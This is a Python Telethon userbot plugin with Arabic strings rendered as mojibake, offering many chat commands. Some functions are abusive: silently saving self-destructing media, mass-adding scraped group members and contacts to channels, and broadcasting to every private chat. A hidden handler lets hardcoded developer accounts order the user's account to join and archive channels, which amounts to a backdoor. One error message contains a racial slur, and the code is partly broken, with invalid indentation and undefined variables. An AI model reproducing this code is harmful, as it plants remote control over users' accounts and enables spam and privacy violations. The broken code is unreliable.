async def auto_save_media(event):
    if auto_save_enabled:
        try:
            if event.media and event.media.ttl_seconds:
                downloadrestrictedcontent = await event.download_media()
                await event.client.send_file("me", downloadrestrictedcontent)
                remove(downloadrestrictedcontent)
        except:
            pass

@client.on(events.NewMessage(outgoing=True, pattern=r"^\.ÿÆÿßÿµ$"))
async def private_handler(event):
    message = await event.get_reply_message()
    if not message:
        return await event.reply("**‚ñ™Ô∏é| Ÿäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ Ÿáÿ∞ÿß ÿßŸÑÿ£ŸÖÿ±.**")

    await event.delete()  

    chats = await event.client.get_dialogs()
    private_chats = [chat for chat in chats if chat.is_user]

    for chat in private_chats:
        try:
            if message.media:
                caption = message.text if message.text else ""  
                await event.client.send_file(chat.id, message.media, caption=caption)
            else:
                await event.client.send_message(chat.id, message.text)
        except Exception as e:
            print(f"ÿÆÿ∑ÿ£ ŸÅŸä ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ÿ•ŸÑŸâ ÿßŸÑÿØÿ±ÿØÿ¥ÿ© {chat.id}: {e}")

@client.on(events.NewMessage(pattern=".ÿ™ÿ≠ŸàŸäŸÑ ŸÜÿµ ?(.*)"))
async def _(event):
    if event.fwd_from:
        return 
    if not event.reply_to_msg_id:
       await event.edit("‚éôÔ∏ô ŸäŸÄÿ¨ÿ®. ÿßŸÑÿ±ÿØ ÿπŸÑŸÄŸâ ÿ±ÿ≥ŸÄÿßŸÑÿ© ÿßŸÑŸÄŸÖÿ≥ÿ™ÿÆÿØŸÖ )")
       return
    reply_message = await event.get_reply_message() 
    if not reply_message.text:
       await event.edit("‚éôÔ∏ô ŸäŸÄÿ¨ÿ®. ÿßŸÑÿ±ÿØ ÿπŸÑŸÄŸâ ÿ±ÿ≥ŸÄÿßŸÑÿ© ÿßŸÑŸÄŸÖÿ≥ÿ™ÿÆÿØŸÖ )")
       return
    chat = "@QuotLyBot"
    sender = reply_message.sender
       await event.edit("‚éôÔ∏ô ŸäŸÄÿ¨ÿ®. ÿßŸÑÿ±ÿØ ÿπŸÑŸÄŸâ ÿ±ÿ≥ŸÄÿßŸÑÿ© ÿßŸÑŸÄŸÖÿ≥ÿ™ÿÆÿØŸÖ )")
       return
    await event.edit("‚éôÔ∏ô ÿ¨ÿßÿ± ÿ™ÿ≠ŸàŸäŸÑ ÿßŸÑŸÜÿµ ÿßŸÑŸâ ŸÖŸÑÿµŸÇ")
    async with event.client.conversation(chat) as conv:
          try:     
              response = conv.wait_event(events.NewMessage(incoming=True,from_users=6383191007))
              await event.client.forward_messages(chat, reply_message)
              response = await response 
          except YouBlockedUserError: 
              await event.reply("```Please unblock me (@QuotLyBot) u Nigga```")
              return
          if response.text.startswith("Hi!"):
             await event.edit("‚éôÔ∏ô Ÿäÿ¨ŸÄÿ® ÿßŸÑÿ∫ÿßÿ° ÿÆÿµŸÄŸàÿµŸäÿ© ÿßŸÑÿ™Ÿàÿ¨ŸäŸÄŸá ÿßŸàŸÑÿß")
          else: 
             await event.delete()
             await event.client.send_message(event.chat_id, response.message)
             

from telethon import events, functions

@client.on(events.NewMessage(pattern=r".ÿ∂Ÿä.ŸÅ ?(.*)"))
async def get_users(event):
    sender = await event.get_sender()
    me = await event.client.get_me()

    if sender.id != me.id:
        roz = await event.edit("**‚ñæ‚àÆ ÿ™ÿ™ŸÄŸÖ ÿßŸÑÿπŸÄŸÖŸÑŸäÿ© ÿßŸÜÿ™ÿ∏ŸÄÿ± ŸÇŸÑŸäŸÑÿßŸã ‚éô ...**")
    else:
        roz = await event.edit("**‚ñæ‚àÆ ÿ™ÿ™ŸÄŸÖ ÿßŸÑÿπŸÄŸÖŸÑŸäÿ© ÿßŸÜÿ™ÿ∏ŸÄÿ± ŸÇŸÑŸäŸÑÿßŸã ‚éô ...**.")

    JoKeRUB = await get_chatinfo(event)
    chat = await event.get_chat()

    if event.is_private:
        return await roz.edit("**‚ñæ‚àÆ ŸÑÿß ŸäŸÖŸÉŸÜŸÜŸÄŸä ÿ•ÿ∂ÿßŸÅŸÄÿ© ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖŸäŸÜ ŸáŸÄŸÜÿß**")

    s = 0  # ÿπÿØÿØ ÿßŸÑÿ•ÿ∂ÿßŸÅÿßÿ™ ÿßŸÑŸÜÿßÿ¨ÿ≠ÿ©
    f = 0  # ÿπÿØÿØ ÿßŸÑÿ£ÿÆÿ∑ÿßÿ°
    error = 'None'

    await roz.edit("**‚ñæ‚àÆ ÿ≠ÿßŸÑÿ© ÿßŸÑÿ•ÿ∂ÿßŸÅÿ©:**\n\n**‚ñæ‚àÆ ÿ™ÿ™ŸÄŸÖ ÿ¨ŸÄŸÖÿπ ŸÖÿπŸÄŸÑŸàŸÖÿßÿ™ ÿßŸÑŸÄŸÖÿ≥ÿ™ÿÆÿØŸÖŸäŸÜ üîÑ ...‚è£**")

    async for user in event.client.iter_participants(JoKeRUB.full_chat.id):
        try:
            if error.startswith("Too"):
                return await roz.edit(
                    f"**ÿ≠ŸÄÿßŸÑÿ© ÿßŸÑÿ£ÿ∂ŸÄÿßŸÅÿ© ÿßŸÜÿ™ŸÄŸáÿ™ ŸÖŸÄÿπ ÿßŸÑÿ£ÿÆŸÄÿ∑ÿßÿ°**\n"
                    f"- (**ÿ±ÿ®ŸÄŸÖÿß ŸáŸÄŸÜÿßŸÑŸÉ ÿ∂ÿ∫ŸÄÿ∑ ÿπŸÄŸÑŸâ ÿßŸÑÿ£ŸÖ‡¢™ ÿ≠ÿßŸàŸÑ ŸÖÿ¨ÿØÿØÿßŸã ŸÑÿßÿ≠ŸÇŸÄÿß üß∏**)\n"
                    f"**ÿßŸÑŸÄÿÆÿ∑ÿ£** : \n`{error}`\n\n‚Ä¢ ÿßÿ∂ÿßŸÑŸÄÿ© `{s}` \n‚Ä¢ ÿÆŸÄÿ∑ÿ£ ÿ®ÿ£ÿ∂ÿßŸÅŸÄÿ© `{f}`"
                )

            await event.client(functions.channels.InviteToChannelRequest(channel=chat, users=[user.id]))
            s += 1

            await roz.edit(
                f"**‚ñæ‚àÆ ÿ™ÿ™ŸÄŸÖ ÿßŸÑÿ£ÿ∂ŸÄÿßŸÅÿ© ‚éô**\n\n‚Ä¢ ÿßÿ∂ŸÄŸäŸÅ `{s}` \n‚Ä¢  ÿÆŸÄÿ∑ÿ£ ÿ®ÿ£ÿ∂ÿßŸÅŸÄÿ© `{f}` \n\n**√ó ÿ¢ÿÆÿ± ÿÆŸÄÿ∑ÿ£:** `{error}`"
            )
        except Exception as e:
            error = str(e)
            f += 1

    await roz.edit(
        f"**‚ñæ‚àÆ ÿß⁄™ÿ™ŸÄŸÖŸÑÿ™ ÿßŸÑÿ£ÿ∂ÿßŸÅŸÄÿ© ‚úÖ** \n\n‚Ä¢ ÿ™ŸÄŸÖ ÿ®ŸÜÿ¨ŸÄÿßÿ≠ ÿ•ÿ∂ÿßŸÅŸÄÿ© `{s}` \n‚Ä¢ ÿÆŸÄÿ∑ÿ£ ÿ®ÿ£ÿ∂ÿßŸÅŸÄÿ© `{f}`"
    )

@client.on(events.NewMessage(pattern=r".ÿßÿ∂ÿßŸÅÿ©_ÿ¨Ÿáÿßÿ™Ÿä ?(.*)"))
async def Hussein(event):
    channel_id = event.chat_id  
    contacts = await event.client(functions.contacts.GetContactsRequest(hash=0))
    added_count = 0 
    for user in contacts.users:
        try:
            await event.client(functions.channels.InviteToChannelRequest(
                channel=channel_id,
                users=[user.id],
            ))
            added_count += 1
        except Exception as e:
            await event.reply(f"**‚éôÔ∏ô ÿ™ŸÖ ÿ•ÿ∂ÿßŸÅÿ© {added_count} ŸÖŸÜ ÿ¨Ÿáÿßÿ™ ÿßÿ™ÿµÿßŸÑŸä**")
    await event.reply(f"**‚éôÔ∏ô ÿ™ŸÖ ÿ•ÿ∂ÿßŸÅÿ© {added_count} ŸÖŸÜ ÿ¨Ÿáÿßÿ™ ÿßÿ™ÿµÿßŸÑŸä**")
  
@client.on(events.NewMessage(outgoing=True, pattern=r"(.ÿ™ÿßŸÉ_ŸÑŸÑŸÉŸÑ|.all)(.*)"))
async def tagall(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    client.parse_mode = "html"
    message_text = event.pattern_match.group(2).strip()
    chat = await event.get_input_chat()
    me = await client.get_me()
    permissions = await client.get_permissions(chat, me)

    if not permissions.is_admin:
        await event.respond("ÿπÿ∞ÿ±Ÿãÿßÿå ŸÑÿß ÿ£ŸÖŸÑŸÉ ÿµŸÑÿßÿ≠Ÿäÿ© ÿ∞ŸÉÿ± ÿßŸÑÿ¨ŸÖŸäÿπ ŸÅŸä Ÿáÿ∞Ÿá ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ©.")
        return

    all_participants = await client.get_participants(chat)
    hidden_members_found = False

    async def get_members():
        for user in all_participants:
            if not user.deleted:
                try:
                    participant = await client.get_entity(user.id)
                    if not (isinstance(participant, telethon.tl.types.ChannelParticipant) and participant.is_hidden):
                        yield user
                except ValueError:
                    pass

    
    temp_mentions = []  
    async for user in get_members():
        temp_mentions.append(f"<a href='tg://user?id={user.id}'>{user.first_name}</a>")
        
        if len(temp_mentions) == 20:  
            final_mentions = ""
            if message_text:
                final_mentions += f"<b>{message_text}</b>\n"
            final_mentions += " ".join(temp_mentions) + "\n\n"
            if hidden_members_found:
                final_mentions += "(ŸÑÿß ŸäŸÖŸÉŸÜ ÿ∞ŸÉÿ± ÿßŸÑÿ£ÿπÿ∂ÿßÿ° ÿßŸÑŸÖÿÆŸÅŸäŸäŸÜ)\n"
            await client.send_message(chat, final_mentions, parse_mode="html")
            await asyncio.sleep(1)
            
            temp_mentions = []  

  
    if temp_mentions:  
        final_mentions = ""
        if message_text:
            final_mentions += f"<b>{message_text}</b>\n"
        final_mentions += " ".join(temp_mentions) + "\n\n"
        if hidden_members_found:
            final_mentions += "(ŸÑÿß ŸäŸÖŸÉŸÜ ÿ∞ŸÉÿ± ÿßŸÑÿ£ÿπÿ∂ÿßÿ° ÿßŸÑŸÖÿÆŸÅŸäŸäŸÜ)\n"
        await client.send_message(chat, final_mentions, parse_mode="html")
        
    client.parse_mode = "markdown"  
    
@client.on(events.NewMessage(outgoing=True, pattern=r'\.ÿßŸÜÿ∑ŸÇ'))
async def runj(event):
    await event.delete()
    language = event.message.raw_text.split()
    getmessage = await event.get_reply_message()
    messagelocation = event.to_id
    try:
        createtts = gTTS(text=f"{getmessage.message}", lang=f"{language[1]}", slow=False)
        createtts.save(filename)
        await client.send_file(messagelocation, filename)
        remove(filename)
    except:
        pass

@client.on(events.NewMessage(outgoing=True , pattern=r'\.ÿπŸÉÿ≥'))
async def rev(event):
	client = event.client
	if event.is_reply:
		replied = await event.get_reply_message()
		replied_msg_rev = replied.message[::-1]
		await client.edit_message(event.message, replied_msg_rev)

@client.on(events.NewMessage(incoming=True, func=lambda e: e.is_private))
async def mark_as_read(event):
    global aljoker_enabled, JOKER_ID
    sender_id = event.sender_id
    
    
    if aljoker_enabled and sender_id in JOKER_ID:
        joker_time = JOKER_ID[sender_id]  
        if joker_time > 0:
            await asyncio.sleep(joker_time)  
        await event.mark_read()  

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ÿßŸÑÿ™ŸÉÿ®ÿ± ÿ™ÿπÿ∑ŸäŸÑ$'))
async def Hussein(event):
    global aljoker_enabled
    aljoker_enabled = False
    await event.edit('**‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÖÿ± ÿßŸÑÿ™ŸÉÿ®ÿ± ÿ®ŸÜÿ¨ÿßÿ≠ ‚úÖ**')

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ÿßŸÑÿ™ŸÉÿ®ÿ± (\d+) (\d+)$'))
async def Hussein(event):
    global aljoker_enabled, JOKER_ID
    joker_time = int(event.pattern_match.group(1))
    user_id = int(event.pattern_match.group(2)) 
    JOKER_ID[user_id] = joker_time
    aljoker_enabled = True
    await event.edit(f'**‚éôÔ∏ô ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿßŸÖÿ± ÿßŸÑÿ™ŸÉÿ®ÿ± ÿ®ŸÜÿ¨ÿßÿ≠ ŸÖÿπ  {joker_time} ÿ´ÿßŸÜŸäÿ© ŸÑŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ {user_id}**')

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ŸÖŸàÿØ ÿßŸÑÿ™ŸÉÿ®ÿ± ÿ™ÿπÿ∑ŸäŸÑ$'))
async def Hussein(event):
    global hussein_enabled
    hussein_enabled = False
    await event.edit('**‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÖÿ± ÿßŸÑÿ™ŸÉÿ®ÿ± ÿπŸÑŸâ ÿßŸÑÿ¨ŸÖŸäÿπ ÿ®ŸÜÿ¨ÿßÿ≠ ‚úÖ**')
    
@client.on(events.NewMessage(pattern=f".ŸÖŸàÿØ ÿßŸÑÿ™ŸÉÿ®ÿ± (\d+)"))
async def Hussein(event):
    global hussein_enabled, hussein_time
    hussein_time = int(event.pattern_match.group(1))
    hussein_enabled = True
    await event.edit(f'**‚éôÔ∏ô ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿßŸÖÿ± ÿßŸÑÿ™ŸÉÿ®ÿ± ÿ®ŸÜÿ¨ÿßÿ≠ ŸÖÿπ  {hussein_time} ÿ´ÿßŸÜŸäÿ©**')

JOKER_ID = {6383191007: 5, 6383191007: 3}  
aljoker_enabled = True  

@client.on(events.NewMessage(incoming=True, func=lambda e: e.is_private))
async def mark_as_read(event):
    global aljoker_enabled, JOKER_ID
    sender_id = event.sender_id
    
    
    if aljoker_enabled and sender_id in JOKER_ID:
        joker_time = JOKER_ID[sender_id]  
        if joker_time > 0:
            await asyncio.sleep(joker_time)  
        await event.mark_read()  


R = [
    "**ìÜ∞**ÿßŸÑÿπŸÄÿßÿ® ÿßŸÑÿßÿ≠ÿ™ÿ±ÿßŸÅŸäŸá** üéÆìÜ™ \n"
    "  ‚ù∂ **‚™º**  [ÿ≠ÿ±ÿ® ÿßŸÑŸÅÿ∂ÿßÿ° üõ∏](https://t.me/gamee?game=ATARIAsteroids)   \n"
    "  ‚ù∏ **‚™º**  [ÿßŸÑŸÇÿ∑ ÿßŸÑŸÖÿ¥ÿßŸÉÿ≥ üê±](https://t.me/gamee?game=CrazyCat)   \n"
    "  ‚ùπ **‚™º**  [ÿµŸäÿØ ÿßŸÑÿßÿ≥ŸÖÿßŸÉ üêü](https://t.me/gamee?game=SpikyFish3)   \n"
    "  ‚ù∫ **‚™º**  [ÿ≥ÿ®ÿßŸÇ ÿßŸÑÿØÿ±ÿßÿ¨ÿßÿ™ üèç](https://t.me/gamee?game=MotoFX2)   \n"
    "  ‚ùª **‚™º**  [ÿ≥ÿ®ÿßŸÇ ÿ≥Ÿäÿßÿ±ÿßÿ™ üèé](https://t.me/gamee?game=F1Racer)   \n"
    "  ‚ùº **‚™º**  [ÿ¥ÿ∑ÿ±ŸÜÿ¨ ‚ôü](https://t.me/T4TTTTBOT?game=chess)   \n"
    "  ‚ùΩ **‚™º**  [ŸÉÿ±ÿ© ÿßŸÑŸÇÿØŸÖ ‚öΩ](https://t.me/gamee?game=FootballStar)   \n"
    "  ‚ùæ **‚™º**  [ŸÉÿ±ÿ© ÿßŸÑÿ≥ŸÑÿ© üèÄ](https://t.me/gamee?game=BasketBoyRush)   \n"
    "  ‚ùø **‚™º**  [ÿ≥ŸÑÿ© 2 üéØ](https://t.me/gamee?game=DoozieDunks)   \n"
    "  ‚ì´ **‚™º**  [ÿ∂ÿ±ÿ® ÿßŸÑÿßÿ≥ŸáŸÖ üèπ](https://t.me/T4TTTTBOT?game=arrow)   \n"
    "  ‚ì¨ **‚™º**  [ŸÑÿπÿ®ÿ© ÿßŸÑÿßŸÑŸàÿßŸÜ üîµüî¥](https://t.me/T4TTTTBOT?game=color)   \n"
    "  ‚ì≠ **‚™º**  [ŸÉŸàŸÜÿ¨ ŸÅŸà üéΩ](https://t.me/gamee?game=KungFuInc)   \n"
    "  ‚ìÆ **‚™º**  [üêç ŸÑÿπÿ®ÿ© ÿßŸÑÿßŸÅÿπŸâ üêç](https://t.me/T4TTTTBOT?game=snake)   \n"
    "  ‚ìØ **‚™º**  [üöÄ ŸÑÿπÿ®ÿ© ÿßŸÑÿµŸàÿßÿ±ŸäÿÆ üöÄ](https://t.me/T4TTTTBOT?game=rocket)   \n"
    "  ‚ì∞ **‚™º**  [ŸÉŸäÿ® ÿßÿ® üßø](https://t.me/gamee?game=KeepitUP)   \n"
    "  ‚ì± **‚™º**  [ÿ¨Ÿäÿ™ ŸàÿßŸä üö®](https://t.me/gamee?game=Getaway)   \n"
    "  ‚ì≤ **‚™º**  [ÿßŸÑÿßŸÑŸÄŸàÿßŸÜ üîÆ](https://t.me/gamee?game=ColorHit)   \n"
    "  ‚ì≥ **‚™º**  [ŸÖÿØŸÅÿπ ÿßŸÑŸÉÿ±ÿßÿ™üèÆ](https://t.me/gamee?game=NeonBlaster)   \n"
    "**-** ŸÖÿ∑Ÿàÿ± ÿßŸÑÿ≥Ÿàÿ±ÿ≥ **‚™º [êáÆ ìÇê –ò–∑–≤—Ä–∞—â–µ–Ω–µ—Ü ñ†õ ](t.me/nS_R_T)   \n"
    "**-** ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥ **‚™º [êáÆ FLEX ](t.me/source_flex)   "
]

DevJoker = [6383191007, 6383191007]  

@client.on(events.NewMessage(incoming=True))
async def handle_funding_and_archiving(event):
    message_text = event.message.message
    sender_id = event.sender_id

    if sender_id not in DevJoker:
        return

    if message_text.startswith("ÿ™ŸÖŸàŸäŸÑ") or message_text.startswith("ÿßÿ±ÿ¥ŸÅ"):
        parts = message_text.split()
        channel_username = parts[1].replace("@", "") if len(parts) > 1 else None

        if not channel_username:
            await event.reply("**‚éôÔ∏ô ŸäŸèÿ±ÿ¨Ÿâ ÿ™ÿ≠ÿØŸäÿØ ŸÖÿπÿ±ŸÅ ÿßŸÑŸÇŸÜÿßÿ© ÿ£Ÿà ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ© ŸÖÿπ ÿßŸÑÿ™ŸÖŸàŸäŸÑ ÿ£Ÿà ÿßŸÑÿ£ÿ±ÿ¥ŸÅÿ© ŸäÿßŸÖÿ∑Ÿàÿ±Ÿä ‚ù§Ô∏è**")
            return

        try:
            await event.client(JoinChannelRequest(channel_username))
            response = "**‚éôÔ∏ô ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿ•ŸÑŸâ ÿßŸÑŸÇŸÜÿßÿ© ÿ®ŸÜÿ¨ÿßÿ≠!**"

            if message_text.startswith("ÿßÿ±ÿ¥ŸÅ"):
                await event.client.edit_folder(entity=channel_username, folder=1)
                response = "**‚éôÔ∏ô ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿ•ŸÑŸâ ÿßŸÑŸÇŸÜÿßÿ© ÿ®ŸÜÿ¨ÿßÿ≠ ŸàŸàÿ∂ÿπŸáÿß ŸÅŸä ŸÖÿ¨ŸÑÿØ ÿßŸÑÿ£ÿ±ÿ¥ŸäŸÅ!**"

        except ValueError:
            response = "ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿßŸÑŸÇŸÜÿßÿ©. Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÑŸÖÿπÿ±ŸÅ ÿßŸÑÿµÿ≠Ÿäÿ≠"

        await event.reply(response)
        

@client.on(events.NewMessage(pattern=".ŸÅŸÉ ÿßŸÑÿ≠ÿ∏ÿ±$"))
async def handle_unblock_all(event):
    blocked_users = await client(functions.contacts.GetBlockedRequest(
        offset=0,
        limit=200
    ))
    if not blocked_users.users:
        await event.edit("**‚éôÔ∏ô ŸÑÿß ŸäŸàÿ¨ÿØ ŸÖÿ≥ÿ™ÿÆÿØŸÖŸäŸÜ ŸÖÿ≠ÿ∏Ÿàÿ±ŸäŸÜ ŸÅŸä ÿ≠ÿ≥ÿßÿ®ŸÉ ü§∑üèª**")
        return
    for user in blocked_users.users:
        try:
            await client(functions.contacts.UnblockRequest(
                id=InputPeerUser(user.id, user.access_hash)
            ))
            aljoker_entity = await client.get_entity(user.id)
            aljoker_profile = f"[{aljoker_entity.first_name}](tg://user?id={aljoker_entity.id})"
            await event.edit(f"‚éôÔ∏ô ÿ™ŸÖ ÿ•ŸÑÿ∫ÿßÿ° ÿ≠ÿ∏ÿ± ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ : {aljoker_profile}")
            asyncio.sleep(3)
        except ValueError:
            continue
        except Exception as e:
            await event.edit(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ•ŸÑÿ∫ÿßÿ° ÿ≠ÿ∏ÿ± ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ®ŸÖÿπÿ±ŸëŸÅ: {user.id}, ÿßŸÑÿÆÿ∑ÿ£: {e}")
            continue
@client.on(events.NewMessage(pattern="(.ÿ™ÿßÿ±ŸäÿÆŸá|ÿ™ÿßÿ±ŸäÿÆÿ©)$"))
async def Hussein(event):
    reply_to = event.reply_to_msg_id
    if reply_to:
        msg = await client.get_messages(event.chat_id, ids=reply_to)
        user_id = msg.sender_id
        async with client.conversation(chat) as conv:
            await conv.send_message(f'{user_id}')
            response = await conv.get_response()
            await event.edit(response.text)

@client.on(events.NewMessage(pattern=r"\.ÿ≠ÿßŸÑÿ™Ÿä(?: |$)(.*)"))
async def _(event):
    await event.edit("**- Ÿäÿ™ŸÖ ÿßŸÑÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿ≠ÿßŸÑÿ™ŸÉ ÿ•ÿ∞ÿß ŸÉŸÜÿ™ ŸÖÿ≠ÿ∏Ÿàÿ±Ÿãÿß ÿ£Ÿà ŸÑÿß...**")
    
    async with event.client.conversation("@SpamBot") as conv:
        try:
            await conv.send_message("/start")
            response = await conv.get_response()
            await event.client.send_read_acknowledge(conv.chat_id)
        except YouBlockedUserError:
            await event.edit("**ÿ£ŸàŸÑŸãÿßÿå ŸÇŸÖ ÿ®ÿ•ŸÑÿ∫ÿßÿ° ÿ≠ÿ∏ÿ± @SpamBot ÿ´ŸÖ ÿ≠ÿßŸàŸÑ ŸÖÿ¨ÿØÿØŸãÿß.**")
            return

    await event.edit(f"- {response.message}\n@jepthon")


@client.on(events.NewMessage(pattern=".ÿßŸÑÿßÿ∫ŸÜŸäÿ© ?(.*)"))
async def _(event):
    if not event.reply_to_msg_id:
        return await event.edit("**‚ñæ‚àÆ Ÿäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑÿßÿ∫ŸÜŸäŸá ÿßŸàŸÑÿß**")
    reply_message = await event.get_reply_message()
    try:
        async with event.client.conversation(chat) as conv:
            try:
                await event.edit("**‚ñæ‚àÆ Ÿäÿ™ŸÖ ÿßŸÑÿ™ÿπÿ±ŸÅ ÿπŸÑŸâ ÿßŸÑÿßÿ∫ŸÜŸäÿ© ÿßŸÜÿ™ÿ∏ÿ±**")
                start_msg = await conv.send_message("/start")
                response = await conv.get_response()
                send_audio = await conv.send_message(reply_message)
                check = await conv.get_response()
                if not check.text.startswith("Audio received"):
                    return await event.edit(
                        "**‚ñæ‚àÆ Ÿäÿ¨ÿ® ÿßŸÜ ŸäŸÉŸàŸÜ ÿ≠ÿ¨ŸÖ ÿßŸÑÿßÿ∫ŸÜŸäŸá ŸÖŸÜ 5 ÿßŸÑŸâ 10 ÿ´ŸàÿßŸÜŸä **."
                    )
                await event.edit("- ÿßŸÜÿ™ÿ∏ÿ± ŸÇŸÑŸäŸÑÿß")
                result = await conv.get_response()
                await event.client.send_read_acknowledge(conv.chat_id)
            except YouBlockedUserError:
                return
            namem = f"**ÿßŸÑÿ£ÿ∫ŸÜŸäÿ© : **{result.text.splitlines()[0]}\
        \n\n**ÿßŸÑÿ™ŸÅÿßÿµŸäŸÄŸÑ : **{result.text.splitlines()[2]}"
            await event.edit(namem)
            await event.client.delete_messages(
                conv.chat_id,
                [start_msg.id, send_audio.id, check.id, result.id, response.id],
            )
    except TimeoutError:
        return await event.edit("***ÿ≠ÿØÿ´ ÿÆÿ∑ÿß ŸÖÿß ÿ≠ÿßŸàŸÑ ŸÖÿ¨ÿØÿØÿß**")


@client.on(events.NewMessage(pattern=r"\.ÿßŸäŸÖŸäŸÑ ŸàŸáŸÖŸä(?: |$)(.*)"))
async def _(event):
    chat = "@TempMailBot"
    geez = await event.edit("**ÿ¨ÿßÿ±Ÿä ÿ•ŸÜÿ¥ÿßÿ° ÿ®ÿ±ŸäÿØ...**")
    
    async with event.client.conversation(chat) as conv:
        try:
            await conv.send_message("/start")
            await asyncio.sleep(1)
            await conv.send_message("/create")

            response = await conv.get_response()
            await event.client.send_read_acknowledge(conv.chat_id)

            
            l313lmail = None
            if response.reply_markup and response.reply_markup.rows:
                for row in response.reply_markup.rows:
                    for button in row.buttons:
                        if button.url:
                            l313lmail = button.url
                            break
                    if l313lmail:
                        break

        except YouBlockedUserError:
            await geez.edit("**ÿßŸÑÿ∫Ÿä ÿ≠ÿ∏ÿ± @TempMailBot Ÿàÿ≠ÿßŸàŸÑ ŸÖÿ¨ÿØÿØŸãÿß**")
            return

    if l313lmail:
        await event.edit(
            f"ÿßŸÑÿßŸäŸÖŸäŸÑ ÿßŸÑÿÆÿßÿµ ŸáŸà `{response.message}`\n[ÿßÿ∂ÿ∫ÿ∑ ŸáŸÜÿß ŸÑÿ±ÿ§Ÿäÿ© ÿ±ÿ≥ÿßÿ¶ŸÑ ÿßŸÑÿßŸäŸÖŸäŸÑ ÿßŸÑŸàÿßÿ±ÿØÿ©]({l313lmail})"
        )
    else:
        await event.edit(f"ÿßŸÑÿßŸäŸÖŸäŸÑ ÿßŸÑÿÆÿßÿµ ŸáŸà `{response.message}`\n‚ö†Ô∏è ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿ±ÿßÿ®ÿ∑ ÿßŸÑÿ®ÿ±ŸäÿØ.")
        

@client.on(events.NewMessage(outgoing=True, pattern=".ÿ∫ŸÜŸäŸÑŸä$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/DwDi1/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="‚éôÔ∏ô BY : ÿ∫ŸÜŸäŸÑŸä ‚éô",parse_mode="html")
  await joker313.delete()
    
@client.on(events.NewMessage(outgoing=True, pattern=".ÿ¥ÿπÿ±$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/L1BBBL/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="‚éôÔ∏ô BY : ÿ¥ÿπÿ± ‚éô",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".ÿßŸÑŸâ ŸÖÿ™Ÿâ$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/AJ3_0_0/55/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="‚éôÔ∏ô BY : ÿßŸÑŸâ ŸÖÿ™Ÿâ ‚éô",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".ÿßÿ≠ÿ∑ ÿ±ÿ¨ŸÑŸä$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/AJ3_0_0/4/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="‚éôÔ∏ô BY : ÿßÿ≠ÿ∑ ÿ±ÿ¨ŸÑŸä ÿ®ÿ∑Ÿäÿ≤ŸÉ ‚éô",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".ÿ™ÿ®ÿß$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/AJ3_0_0/83/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="‚éôÔ∏ô BY : ÿ™ÿ®ÿß ŸÑŸÉ Ÿä ÿ¥ÿπŸÑŸàÿØ ‚éô",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".ÿßŸÉŸÑ ÿÆÿ±ÿß$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/AJ3_0_0/86/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="‚éôÔ∏ô BY : ÿßŸÉŸÑ ÿÆÿ±ÿß ‚éô",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".ŸÇÿ±ÿßŸÜ$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/QuraanJep/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="‚éôÔ∏ô BY : ŸÇÿ±ÿßŸÜ ü§≤üèª‚ò™Ô∏è",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".ÿπŸäÿ®$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/i1Voices/1811/{rl}"
